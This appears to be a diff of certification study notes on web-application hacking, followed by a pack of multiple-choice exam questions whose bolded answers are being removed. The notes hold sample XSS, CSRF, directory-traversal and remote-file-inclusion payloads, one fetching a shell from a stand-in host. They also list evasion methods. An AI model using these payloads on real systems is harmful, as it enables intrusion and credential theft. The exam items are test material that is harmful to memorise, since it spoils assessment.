+   - Escalate privileges (if OS-level or DB-level access is possible).
+5. Covering Tracks
+   - Clear logs or use evasion techniques.
+
+------
+
+### 4. Attacks in Detail: Practical Examples
+
+#### 4.1 Cross-Site Scripting (XSS)
+
+- Reflected XSS Example
+
+  ```html
+  <script>alert('XSS');</script>
+  ```
+
+  Injected into a search parameter; the response immediately reflects the script.
+
+- Stored (Persistent) XSS Example
+
+  - User-submitted comment on a blog containing:
+
+    ```html
+    <script>document.cookie = 'steal=' + document.cookie;</script>
+    ```
+
+  - Executes for all visitors viewing the comment.
+
+#### 4.2 Cross-Site Request Forgery (CSRF)
+
+- Example:
+
+  ```html
+  <img src="http://target.com/transfer?amount=10000&to=attacker" />
+  ```
+
+  When a logged-in user visits the attacker’s page, their browser automatically sends a request to the target with valid session cookies.
+
+#### 4.3 Directory Traversal
+
+- Example:
+
+  ```
+  http://target.com/view.php?file=../../etc/passwd
+  ```
+
+  Accesses files outside the web root directory.
+
+#### 4.4 File Inclusion
+
+- Local File Inclusion (LFI)
+
+  Example:
+
+  ```
+  http://target.com/index.php?page=../../etc/passwd
+  ```
+
+- Remote File Inclusion (RFI)
+
+  Example:
+
+  ```
+  http://target.com/index.php?file=http://evil.com/shell.txt
+  ```
+
+#### 4.5 Session Hijacking
+
+- Example:
+  - Intercept an HTTP request with a tool like Burp Suite.
+  - Capture `PHPSESSID` or `JSESSIONID` from cookies; reuse it to impersonate the user.
+
+------
+
+### 5. Web Application Tools & Techniques
+
+- Burp Suite
+  - Proxy for intercepting/modifying requests, scanning vulnerabilities, brute forcing forms.
+- OWASP ZAP
+  - Open-source alternative for proxying and scanning.
+- Nikto
+  - Web server scanner, checks for common misconfigurations and vulnerabilities.
+- Wapiti, Skipfish
+  - Automated scanners for common web flaws.
+
+------
+
+### 6. Evasion Methods
+
+Below are techniques used to avoid detection by WAFs or IDS:
+
+1. URL Encoding
+   - Encoding characters (`%20` for space, `%3C` for `<`).
+2. Base64 / Hex Encoding
+   - Concealing payload in encoded strings.
+3. Obfuscation with Comments
+   - e.g., `/*some comment*/` in the middle of an injection.
+4. Changing HTTP Headers
+   - Altering user-agent, referrer, or using custom headers.
+5. IP Fragmentation
+   - Splitting malicious payload across several packets.
+
+------
+
+### 7. Countermeasures
+
+#### 7.1 Secure Coding Practices
+
+- Input Validation & Output Encoding
+  - Filter or sanitize all user inputs.
+  - Encode outputs (e.g., `HTML entity encoding` against XSS).
+- Use Framework Security Features
+  - Built-in CSRF tokens, default escaping (e.g., Django, Ruby on Rails).
+- Least Privilege
+  - Restrict app user DB permissions (INSERT, SELECT only as needed).
+
+#### 7.2 Authentication and Session Management
+
+- Strong Session IDs
+  - Generate random tokens; set secure flags (`HttpOnly`, `Secure`).
+- Session Expiration
+  - Invalidate sessions on logout, enforce timeouts.
+
+#### 7.3 Configuration Hardening
+
+- Disable Unused Services
+  - Remove sample files, default credentials, extra plugins.
+- Patch and Update
+  - Keep OS, server, frameworks, and libraries up to date.
+
+#### 7.4 Logging & Monitoring
+
+- Centralized Logging
+  - Store logs securely and analyze anomalies.
+- Intrusion Detection/Prevention
+  - WAF (Web Application Firewall) or IDS/IPS with up-to-date signatures.
+
+------
+
+### 8. Common Attack/Defense Tools
+
+| Tool       | Purpose                        | Usage                                                        |
+| ---------- | ------------------------------ | ------------------------------------------------------------ |
+| Burp Suite | Proxy, scanning, spidering     | Intercept/modify requests, find vulnerabilities              |
+| OWASP ZAP  | Web proxy and scanner          | Similar to Burp; automated + manual testing                  |
+| Nikto      | Web server scanner             | Checks for default files, misconfigurations, vulnerable scripts |
+| Metasploit | Exploit framework              | Contains web exploit modules                                 |
+| WAF        | Web Application Firewall       | Filters, monitors, or blocks suspicious HTTP traffic         |
+| IDS/IPS    | Intrusion Detection/Prevention | Network-level or host-level detection of malicious patterns  |
+
+------
+
+### 9. Hacking Methodology Recap
+
+1. Recon: Identify the target’s tech stack, gather info.
+2. Enumeration: Look for potential entry points, hidden paths.
+3. Vulnerability Scanning: Automate checks with tools like Nikto/ZAP.
+4. Manual Exploitation: Craft malicious payloads (XSS, CSRF, LFI, SQLi, etc.).
+5. Privilege Escalation: Attempt to gain higher-level access.
+6. Maintain Access: Establish backdoors or persistent footholds (where possible).
+7. Cover Tracks: Clear logs, hide processes.
+
 # Questions Pack
 
 Ces questions sont issues du site Exam
@@ -1619,7 +1848,7 @@ Ces questions sont issues du site Exam
 In this form of encryption algorithm, every individual block contains 64-bit data, and three keys are used, where each key consists of 56 bits. Which is this encryption algorithm?
 
 - A. IDEA
-- **B. Triple Data Encryption Standard**
+- B. Triple Data Encryption Standard
 - C. AES
 - D. MD5 encryption algorithm
 
@@ -1632,7 +1861,7 @@ John is investigating web-application firewall logs and observers that someone i
 What type of attack is this?
 
 - A. SQL injection
-- **B. Buffer overflow**
+- B. Buffer overflow
 - C. CSRF
 - D. XSS
 
@@ -1644,7 +1873,7 @@ Which of the following attack techniques is used by John?
 - A. Insider threat
 - B. Diversion theft
 - C. Spear-phishing sites
-- **D. Advanced persistent threat**
+- D. Advanced persistent threat
 
 ---
 
@@ -1652,7 +1881,7 @@ You are attempting to run an Nmap port scan on a web server. Which of the follow
 
 - A. nmap -A - Pn
 - B. nmap -sP -p-65535 -T5
-- **C. nmap -sT -O -T0**
+- C. nmap -sT -O -T0
 - D. nmap -A --host-timeout 99 -T1
 
 ---
@@ -1661,7 +1890,7 @@ This wireless security protocol allows 192-bit minimum-strength security protoco
 Which is this wireless security protocol?
 
 - A. WPA3-Personal
-- **B. WPA3-Enterprise**
+- B. WPA3-Enterprise
 - C. WPA2-Enterprise
 - D. WPA2-Personal
 
@@ -1671,7 +1900,7 @@ What are common files on a web server that can be misconfigured and provide usef
 
 - A. httpd.conf
 - B. administration.config
-- **C. php.ini**
+- C. php.ini
 - D. idq.dll
 
 ---
@@ -1682,7 +1911,7 @@ What is the tool employed by Gerard in the above scenario?
 - A. Towelroot
 - B. Knative
 - C. zANTI
-- **D. Bluto**
+- D. Bluto
 
 ---
 
@@ -1692,7 +1921,7 @@ Which of the following tools would not be useful for cracking the hashed passwor
 - A. Hashcat
 - B. John the Ripper
 - C. THC-Hydra
-- **D. netcat**
+- D. netcat
 
 ---
 
@@ -1701,7 +1930,7 @@ Which of the following Google advanced search operators helps an attacker in gat
 - A. [inurl:]
 - B. [info:]
 - C. [site:]
-- **D. [related:]**
+- D. [related:]
 
 ---
 
@@ -1709,7 +1938,7 @@ You are a penetration tester working to test the user awareness of the employees
 Which stage of the cyber kill chain are you at?
 
 - A. Reconnaissance
-- **B. Weaponization**
+- B. Weaponization
 - C. Command and control
 - D. Exploitation
 
@@ -1717,7 +1946,7 @@ Which stage of the cyber kill chain are you at?
 
 While performing an Nmap scan against a host, Paola determines the existence of a firewall. In an attempt to determine whether the firewall is stateful or stateless, which of the following options would be best to use?
 
-- **A. -sA**
+- A. -sA
 - B. -sX
 - C. -sT
 - D. -sF
@@ -1728,7 +1957,7 @@ A newly joined employee, Janet, has been allocated an existing system used by a 
 What is the type of vulnerability assessment performed by Martin?
 
 - A. Database assessment
-- **B. Host-based assessment**
+- B. Host-based assessment
 - C. Credentialed assessment
 - D. Distributed assessment
 
@@ -1738,7 +1967,7 @@ Jane, an ethical hacker, is testing a target organization’s web server and web
 What is the attack technique employed by Jane in the above scenario?
 
 - A. Session hijacking
-- **B. Website mirroring**
+- B. Website mirroring
 - C. Website defacement
 - D. Web cache poisoning
 
@@ -1750,7 +1979,7 @@ What is the type of vulnerability assessment solution that James employed in the
 - A. Service-based solutions
 - B. Product-based solutions
 - C. Tree-based assessment
-- **D. Inference-based assessment**
+- D. Inference-based assessment
 
 *Scanning services configurations and then start acting only on THESE services.*
 
@@ -1760,7 +1989,7 @@ Taylor, a security professional, uses a tool to monitor her company’s website,
 Which of the following tools did Taylor employ in the above scenario?
 
 - A. Webroot
-- **B. Web-Stat**
+- B. Web-Stat
 - C. WebSite-Watcher
 - D. WAFW00F
 
@@ -1772,14 +2001,14 @@ Which regional Internet registry should Becky go to for detailed information?
 - A. ARIN
 - B. LACNIC
 - C. APNIC
-- **D. RIPE**
+- D. RIPE
 
 ---
 
 Harry, a professional hacker, targets the IT infrastructure of an organization. After preparing for the attack, he attempts to enter the target network using techniques such as sending spear-phishing emails and exploiting vulnerabilities on publicly available servers. Using these techniques, he successfully deployed malware on the target system to establish an outbound connection.
 What is the APT lifecycle phase that Harry is currently executing?
 
-- **A. Initial intrusion**
+- A. Initial intrusion
 - B. Persistence
 - C. Cleanup
 - D. Preparation
@@ -1789,7 +2018,7 @@ What is the APT lifecycle phase that Harry is currently executing?
 Robin, a professional hacker, targeted an organization’s network to sniff all the traffic. During this process, Robin plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to sniff all the traffic in the network. What is the attack performed by Robin in the above scenario?
 
 - A. ARP spoofing attack
-- **B. STP attack**
+- B. STP attack
 - C. DNS poisoning attack
 - D. VLAN hopping attack
 
@@ -1802,7 +2031,7 @@ An attacker utilizes a Wi-Fi Pineapple to run an access point with a legitimate-
 - A. MAC spoofing attack
 - B. War driving attack
 - C. Phishing attack
-- **D. Evil-twin attack**
+- D. Evil-twin attack
 
 *EvilTwin: Setup a malicious wifi acess*
 
@@ -1811,7 +2040,7 @@ An attacker utilizes a Wi-Fi Pineapple to run an access point with a legitimate-
 CyberTech Inc. recently experienced SQL injection attacks on its official website. The company appointed Bob, a security professional, to build and incorporate defensive strategies against such attacks. Bob adopted a practice whereby only a list of entities such as the data type, range, size, and value, which have been approved for secured access, is accepted.
 What is the defensive technique employed by Bob in the above scenario?
 
-- **A. Whitelist validation**
+- A. Whitelist validation
 - B. Output encoding
 - C. Blacklist validation
 - D. Enforce least privileges
@@ -1824,14 +2053,14 @@ In the NIST cloud deployment reference architecture, under which category does t
 - A. Cloud consumer
 - B. Cloud broker
 - C. Cloud auditor
-- **D. Cloud carrier**
+- D. Cloud carrier
 
 ---
 
 Bobby, an attacker, targeted a user and decided to hijack and intercept all their wireless communications. He installed a fake communication tower between two authentic endpoints to mislead the victim. Bobby used this virtual tower to interrupt the data transmission between the user and real tower, attempting to hijack an active session. Upon receiving the user’s request, Bobby manipulated the traffic with the virtual tower and redirected the victim to a malicious website.
 What is the attack performed by Bobby in the above scenario?
 
-- **A. aLTEr attack**
+- A. aLTEr attack
 - B. Jamming signal attack
 - C. Wardriving
 - D. KRACK attack
@@ -1843,7 +2072,7 @@ What is the tool employed by John to gather information from the LDAP service?
 
 - A. ike-scan
 - B. Zabasearch
-- **C. JXplorer**
+- C. JXplorer
 - D. EarthExplorer
 
 ---
@@ -1851,7 +2080,7 @@ What is the tool employed by John to gather information from the LDAP service?
 Annie, a cloud security engineer, uses the Docker architecture to employ a client/server model in the application she is working on. She utilizes a component that can process API requests and handle various Docker objects, such as containers, volumes, images, and networks. What is the component of the Docker architecture used by Annie in the above scenario?
 
 - A. Docker objects
-- **B. Docker daemon**
+- B. Docker daemon
 - C. Docker client
 - D. Docker registries
 
@@ -1860,7 +2089,7 @@ Annie, a cloud security engineer, uses the Docker architecture to employ a clien
 Bob, an attacker, has managed to access a target IoT device. He employed an online tool to gather information related to the model of the IoT device and the certifications granted to it.
 Which of the following tools did Bob employ to gather the above information?
 
-- **A. FCC ID search**
+- A. FCC ID search
 - B. Google image search
 - C. search.com
 - D. EarthExplorer
@@ -1872,7 +2101,7 @@ What piece of hardware on a computer’s motherboard generates encryption keys a
 - A. CPU
 - B. UEFI
 - C. GPU
-- **D. TPM**
+- D. TPM
 
 *TPM: Trusted Platform Module*
 
@@ -1881,7 +2110,7 @@ What piece of hardware on a computer’s motherboard generates encryption keys a
 Gilbert, a web developer, uses a centralized web API to reduce complexity and increase the integrity of updating and changing data. For this purpose, he uses a web service that uses HTTP methods such as PUT, POST, GET, and DELETE and can improve the overall performance, visibility, scalability, reliability, and portability of an application.
 What is the type of web-service API mentioned in the above scenario?
 
-- **A. RESTful API**
+- A. RESTful API
 - B. JSON-RPC
 - C. SOAP API
 - D. REST API
@@ -1892,7 +2121,7 @@ To create a botnet, the attacker can use several techniques to scan vulnerable m
 
 - A. Subnet scanning technique
 - B. Permutation scanning technique
-- **C. Hit-list scanning technique.**
+- C. Hit-list scanning technique.
 - D. Topological scanning technique
 
 *Hit-list: create a list with vulnerable sites, known vulnerabilities.*
@@ -1903,7 +2132,7 @@ Nicolas just found a vulnerability on a public-facing system that is considered 
 What type of hacker is Nicolas?
 
 - A. Black hat
-- **B. White hat**
+- B. White hat
 - C. Gray hat
 - D. Red hat
 
@@ -1912,7 +2141,7 @@ What type of hacker is Nicolas?
 Sophia is a shopping enthusiast who spends significant time searching for trendy outfits online. Clark, an attacker, noticed her activities several times and sent a fake email containing a deceptive page link to her social media page displaying all-new and trendy outfits. In excitement, Sophia clicked on the malicious link and logged in to that page using her valid credentials.
 Which of the following tools is employed by Clark to create the spoofed email?
 
-- **A. Evilginx**
+- A. Evilginx
 - B. Slowloris
 - C. PLCinject
 - D. PyLoris
@@ -1922,7 +2151,7 @@ Which of the following tools is employed by Clark to create the spoofed email?
 John, a disgruntled ex-employee of an organization, contacted a professional hacker to exploit the organization. In the attack process, the professional hacker installed a scanner on a machine belonging to one of the victims and scanned several machines on the same network to identify vulnerabilities to perform further exploitation.
 What is the type of vulnerability assessment tool employed by John in the above scenario?
 
-- **A. Agent-based scanner**
+- A. Agent-based scanner
 - B. Network-based scanner
 - C. Cluster scanner
 - D. Proxy scanner
@@ -1934,7 +2163,7 @@ What is the type of vulnerability assessment tool employed by John in the above 
 Joel, a professional hacker, targeted a company and identified the types of websites frequently visited by its employees. Using this information, he searched for possible loopholes in these websites and injected a malicious script that can redirect users from the web page and download malware onto a victim's machine. Joel waits for the victim to access the infected web application so as to compromise the victim's machine.
 Which of the following techniques is used by Joel in the above scenario?
 
-- **A. Watering hole attack**
+- A. Watering hole attack
 - B. DNS rebinding attack
 - C. MarioNet attack
 - D. Clickjacking attack
@@ -1944,7 +2173,7 @@ Which of the following techniques is used by Joel in the above scenario?
 Security administrator John Smith has noticed abnormal amounts of traffic coming from local computers at night. Upon reviewing, he finds that user data have been exfiltrated by an attacker. AV tools are unable to find any malicious software, and the IDS/IPS has not reported on any non-whitelisted programs.
 What type of malware did the attacker use to bypass the company’s application whitelisting?
 
-- **A. File-less malware**
+- A. File-less malware
 - B. Zero-day malware
 - C. Phishing malware
 - D. Logic bomb malware
@@ -1955,7 +2184,7 @@ Dorian is sending a digitally signed email to Poly. With which key is Dorian sig
 
 - A. Dorian is signing the message with his public key, and Poly will verify that the message came from Dorian by using Dorian’s private key.
 - B. Dorian is signing the message with Poly’s private key, and Poly will verify that the message came from Dorian by using Dorian’s public key.
-- **C. Dorian is signing the message with his private key, and Poly will verify that the message came from Dorian by using Dorian’s public key.**
+- C. Dorian is signing the message with his private key, and Poly will verify that the message came from Dorian by using Dorian’s public key.
 - D. Dorian is signing the message with Poly’s public key, and Poly will verify that the message came from Dorian by using Dorian’s public key.
 
 ---
@@ -1966,7 +2195,7 @@ What type of attack he is experiencing?
 - A. DHCP spoofing
 - B. DoS attack
 - C. ARP cache poisoning
-- **D. DNS hijacking**
+- D. DNS hijacking
 
 ---
 
@@ -1976,7 +2205,7 @@ What is the attack performed by Boney in the above scenario?
 - A. Forbidden attack
 - B. CRIME attack
 - C. Session donation attack
-- **D. Session fixation attack**
+- D. Session fixation attack
 
 *MITM: Man in the midlde; Donation attack does not exist.*
 
@@ -1987,7 +2216,7 @@ What is the technique used by Kevin to evade the IDS system?
 
 - A. Session splicing
 - B. Urgency flag
-- **C. Obfuscating**
+- C. Obfuscating
 - D. Desynchronization
 
 ---
@@ -2001,7 +2230,7 @@ Based on the above credentials, which of the following SQL commands are you expe
 - A. select * from Users where UserName = ‘attack’ ’ or 1=1 -- and UserPassword = ‘123456’
 - B. select * from Users where UserName = ‘attack’ or 1=1 -- and UserPassword = ‘123456’
 - C. select * from Users where UserName = ‘attack or 1=1 -- and UserPassword = ‘123456’
-- **D. select * from Users where UserName = ‘attack’ or 1=1 --’ and UserPassword = ‘123456’**
+- D. select * from Users where UserName = ‘attack’ or 1=1 --’ and UserPassword = ‘123456’
 
 ---
 
@@ -2009,7 +2238,7 @@ Which of the following commands checks for valid users on an SMTP server?
 
 - A. RCPT
 - B. CHK
-- **C. VRFY**
+- C. VRFY
 - D. EXPN
 
 ---
@@ -2017,7 +2246,7 @@ Which of the following commands checks for valid users on an SMTP server?
 Bella, a security professional working at an IT firm, finds that a security breach has occurred while transferring important files. Sensitive data, employee usernames, and passwords are shared in plaintext, paving the way for hackers to perform successful session hijacking. To address this situation, Bella implemented a protocol that sends data using encryption and digital certificates.
 Which of the following protocols is used by Bella?
 
-- **A. FTPS**
+- A. FTPS
 - B. FTP
 - C. HTTPS
 - D. IP
@@ -2029,7 +2258,7 @@ John wants to send Marie an email that includes sensitive information, and he do
 - A. Use his own private key to encrypt the message.
 - B. Use his own public key to encrypt the message.
 - C. Use Marie’s private key to encrypt the message.
-- **D. Use Marie’s public key to encrypt the message.**
+- D. Use Marie’s public key to encrypt the message.
 
 ---
 
@@ -2038,14 +2267,14 @@ In the Common Vulnerability Scoring System (CVSS) v3.1 severity ratings, what ra
 - A. 4.0-6.0
 - B. 3.9-6.9
 - C. 3.0-6.9
-- **D. 4.0-6.9**
+- D. 4.0-6.9
 
 ---
 
 Bill is a network administrator. He wants to eliminate unencrypted traffic inside his company’s network. He decides to setup a SPAN port and capture all traffic to the datacenter. He immediately discovers unencrypted traffic in port UDP 161. What protocol is this port using and how can he secure that traffic?
 
 - A. RPC and the best practice is to disable RPC completely.
-- **B. SNMP and he should change it to SNMP V3.**
+- B. SNMP and he should change it to SNMP V3.
 - C. SNMP and he should change it to SNMP V2, which is encrypted.
 - D. It is not necessary to perform any actions, as SNMP is not carrying important information.
 
@@ -2057,7 +2286,7 @@ Consider the following Nmap output:
 
 What command-line parameter could you use to determine the type and version number of the web server?
 
-- **A. -sV**
+- A. -sV
 - B. -sS
 - C. -Pn
 - D. -V
@@ -2070,14 +2299,14 @@ Which of the following regulations is mostly violated?
 - A. PCI DSS
 - B. PII
 - C. ISO 2002
-- **D. HIPPA/PHI**
+- D. HIPPA/PHI
 
 ---
 
 Infecting a system with malware and using phishing to gain credentials to a system or web application are examples of which phase of the ethical hacking methodology?
 
 - A. Scanning
-- **B. Gaining access**
+- B. Gaining access
 - C. Maintaining access
 - D. Reconnaissance
 
@@ -2087,7 +2316,7 @@ Larry, a security professional in an organization, has noticed some abnormalitie
 Which of the following countermeasures must Larry implement to secure the user accounts on the web server?
 
 - A. Retain all unused modules and application extensions.
-- **B. Limit the administrator or root-level access to the minimum number of users.**
+- B. Limit the administrator or root-level access to the minimum number of users.
 - C. Enable all non-interactive accounts that should exist but do not require interactive login.
 - D. Enable unused default user accounts created during the installation of an OS.
 
@@ -2099,7 +2328,7 @@ There are multiple cloud deployment options depending on how isolated a customer
 What is this cloud deployment option called?
 
 - A. Private
-- **B. Community**
+- B. Community
 - C. Public
 - D. Hybrid
 
@@ -2110,7 +2339,7 @@ Identify the NetBIOS code used for obtaining the messenger service running for t
 
 - A. <00>
 - B. <20>
-- **C. <03>**
+- C. <03>
 - D. <1B>
 
 ---
@@ -2121,7 +2350,7 @@ What is the attack performed on Don in the above scenario?
 - A. SIM card attack
 - B. Clickjacking
 - C. SMS phishing attack
-- **D. Agent Smith attack**
+- D. Agent Smith attack
 
 ---
 
@@ -2129,7 +2358,7 @@ Samuel, a security administrator, is assessing the configuration of a web server
 Which of the following attacks can be performed by exploiting the above vulnerability?
 
 - A. Padding oracle attack
-- **B. DROWN attack**
+- B. DROWN attack
 - C. DUHK attack
 - D. Side-channel attack
 
@@ -2140,7 +2369,7 @@ What is the online tool employed by Clark in the above scenario?
 
 - A. DuckDuckGo
 - B. AOL
-- **C. ARIN**
+- C. ARIN
 - D. Baidu
 
 ---
@@ -2151,14 +2380,14 @@ What flag will you use to satisfy this requirement?
 - A. The -g flag
 - B. The -A flag
 - C. The -f flag
-- **D. The -D flag**
+- D. The -D flag
 
 ---
 
 Jude, a pen tester, examined a network from a hacker’s perspective to identify exploits and vulnerabilities accessible to the outside world by using devices such as firewalls, routers, and servers. In this process, he also estimated the threat of network security attacks and determined the level of security of the corporate network. What is the type of vulnerability assessment that Jude performed on the organization?
 
 - A. Application assessment
-- **B. External assessment**
+- B. External assessment
 - C. Passive assessment
 - D. Host-based assessment
 
@@ -2166,7 +2395,7 @@ Jude, a pen tester, examined a network from a hacker’s perspective to identify
 
 Widespread fraud at Enron, WorldCom, and Tyco led to the creation of a law that was designed to improve the accuracy and accountability of corporate disclosures. It covers accounting firms and third parties that provide financial services to some organizations and came into effect in 2002. This law is known by what acronym?
 
-- **A. SOX**
+- A. SOX
 - B. FedRAMP
 - C. HIPAA
 - D. PCI DSS
@@ -2179,14 +2408,14 @@ Which of the following attacks did Abel perform in the above scenario?
 - A. Rogue DHCP server attack
 - B. VLAN hopping
 - C. STP attack
-- **D. DHCP starvation**
+- D. DHCP starvation
 
 ----
 
 This form of encryption algorithm is a symmetric key block cipher that is characterized by a 128-bit block size, and its key size can be up to 256 bits. Which among the following is this encryption algorithm?
 
 - A. HMAC encryption algorithm
-- **B. Twofish encryption algorithm**
+- B. Twofish encryption algorithm
 - C. IDEA
 - D. Blowfish encryption algorithm
 
@@ -2195,7 +2424,7 @@ This form of encryption algorithm is a symmetric key block cipher that is charac
 Jude, a pen tester working in Keiltech Ltd., performs sophisticated security testing on his company's network infrastructure to identify security loopholes. In this process, he started to circumvent the network protection tools and firewalls used in the company. He employed a technique that can create forged TCP sessions by carrying out multiple SYN, ACK, and RST or FIN packets. Further, this process allowed Jude to execute DDoS attacks that can exhaust the network resources.
 What is the attack technique used by Jude for finding loopholes in the above scenario?
 
-- **A. Spoofed session flood attack**
+- A. Spoofed session flood attack
 - B. UDP flood attack
 - C. Peer-to-peer attack
 - D. Ping-of-death attack
@@ -2205,7 +2434,7 @@ What is the attack technique used by Jude for finding loopholes in the above sce
 Jim, a professional hacker, targeted an organization that is operating critical industrial infrastructure. Jim used Nmap to scan open ports and running services on systems connected to the organization’s OT network. He used an Nmap command to identify Ethernet/IP devices connected to the Internet and further gathered information such as the vendor name, product code and name, device name, and IP address. Which of the following Nmap commands helped Jim retrieve the required information?
 
 - A. nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p < Port List > < Target IP >
-- **B. nmap -Pn -sU -p 44818 --script enip-info < Target IP >**
+- B. nmap -Pn -sU -p 44818 --script enip-info < Target IP >
 - C. nmap -Pn -sT -p 46824 < Target IP >
 - D. nmap -Pn -sT -p 102 --script s7-info < Target IP >
 
@@ -2217,7 +2446,7 @@ What kind of attack is possible in this scenario?
 - A. Cross-site scripting
 - B. SQL injection
 - C. Denial of service
-- **D. Directory traversal**
+- D. Directory traversal
 
 ---
 
@@ -2227,7 +2456,7 @@ What is the type of attack performed by Richard in the above scenario?
 - A. Cryptanalysis attack
 - B. Reconnaissance attack
 - C. Side-channel attack
-- **D. Replay attack**
+- D. Replay attack
 
 ---
 
@@ -2235,7 +2464,7 @@ Which of the following allows attackers to draw a map or outline the target orga
 
 - A. Vulnerability analysis
 - B. Malware analysis
-- **C. Scanning networks**
+- C. Scanning networks
 - D. Enumeration
 
 ---
@@ -2243,7 +2472,7 @@ Which of the following allows attackers to draw a map or outline the target orga
 Your company was hired by a small healthcare provider to perform a technical assessment on the network. What is the best approach for discovering vulnerabilities on a Windows-based computer?
 
 - A. Use the built-in Windows Update tool
-- **B. Use a scan tool like Nessus**
+- B. Use a scan tool like Nessus
 - C. Check MITRE.org for the latest list of CVE findings
 - D. Create a disk image of a clean Windows installation
 
@@ -2253,7 +2482,7 @@ Susan, a software developer, wants her web API to update other applications with
 Which of the following techniques is employed by Susan?
 
 - A. Web shells
-- **B. Webhooks**
+- B. Webhooks
 - C. REST API
 - D. SOAP API
 
@@ -2264,7 +2493,7 @@ Which IOS jailbreaking technique patches the kernel during the device boot so th
 - A. Tethered jailbreaking
 - B. Semi-untethered jailbreaking
 - C. Semi-tethered jailbreaking
-- **D. Untethered jailbreaking**
+- D. Untethered jailbreaking
 
 ---
 
@@ -2272,7 +2501,7 @@ Stella, a professional hacker, performs an attack on web services by exploiting 
 Which of the following attack techniques is used by Stella to compromise the web services?
 
 - A. Web services parsing attacks
-- **B. WS-Address spoofing**
+- B. WS-Address spoofing
 - C. SOAPAction spoofing
 - D. XML injection
 
@@ -2281,7 +2510,7 @@ Which of the following attack techniques is used by Stella to compromise the web
 Attacker Steve targeted an organization’s network with the aim of redirecting the company’s web traffic to another malicious website. To achieve this goal, Steve performed DNS cache poisoning by exploiting the vulnerabilities in the DNS server software and modified the original IP address of the target website to that of a fake website.
 What is the technique employed by Steve to gather information for identity theft?
 
-- **A. Pharming**
+- A. Pharming
 - B. Skimming
 - C. Pretexting
 - D. Wardriving
@@ -2291,7 +2520,7 @@ What is the technique employed by Steve to gather information for identity theft
 What is the port to block first in case you are suspicious that an IoT device has been compromised?
 
 - A. 22
-- **B. 48101**
+- B. 48101
 - C. 80
 - D. 443
 
@@ -2299,7 +2528,7 @@ What is the port to block first in case you are suspicious that an IoT device ha
 
 Clark is a professional hacker. He created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection. Identify the behavior of the adversary in the above scenario.
 
-- **A. Unspecified proxy activities**
+- A. Unspecified proxy activities
 - B. Use of command-line interface
 - C. Data staging
 - D. Use of DNS tunneling
@@ -2311,7 +2540,7 @@ What firewall evasion scanning technique make use of a zombie system that has lo
 - A. Packet fragmentation scanning
 - B. Spoof source address scanning
 - C. Decoy scanning
-- **D. Idle scanning**
+- D. Idle scanning
 
 ---
 
